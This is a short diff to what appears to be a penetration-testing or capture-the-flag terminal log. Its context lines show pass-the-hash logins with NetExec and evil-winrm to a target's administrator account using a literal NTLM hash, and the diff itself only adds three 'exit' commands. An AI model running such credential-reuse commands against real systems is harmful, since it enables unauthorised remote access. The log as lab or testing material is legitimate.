@@ -187,3 +187,6 @@
 [2026-02-07 16:01:48] [pane=%1] [CMD] nxc smb $IP -u administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'
 [2026-02-07 16:02:08] [pane=%1] [CMD] evil-winrm -i $IP -u Administrator -h 'ee4457ae59f1e3fbd764e33d9cef123d'
 [2026-02-07 16:03:10] [pane=%1] [CMD] evil-winrm -i $IP -u Administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'
+[2026-02-11 05:53:09] [pane=%2] [CMD] exit
+[2026-02-11 05:53:19] [pane=%1] [CMD] exit
+[2026-02-11 05:53:25] [pane=%0] [CMD] exit
